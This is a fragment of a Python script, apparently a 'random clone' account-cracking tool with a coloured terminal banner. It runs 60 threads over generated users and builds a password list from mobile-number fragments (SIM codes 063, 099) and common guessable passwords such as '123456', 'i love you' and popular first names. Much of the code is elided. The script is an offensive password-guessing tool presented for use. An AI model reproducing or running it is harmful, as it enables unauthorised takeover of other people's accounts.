...
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[TOOLS]= \033[1;36m\033[1;36mRANDOM CLONE
\033[1;36m =[VERSION]= \033[1;36m\033[1;36MODIFIED
\033[1;36m═════════════════════════════════════════════════════════════
"""
linex=('\033[1;36m═════════════════════════════════════════════════════════════')
class Main:
...
def v2():
    ...
    os.system('clear')
    print(logo)
    print(f'\033[1;36m=[~]= SIM CODE : 063, 099 ')
    ...
    with ThreadPool(max_workers=60) as akash:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'123456','pogiko123','lamiya','sadiya','fatema','i love you','annat','farhan','ariyan','jarif','bangladesh']
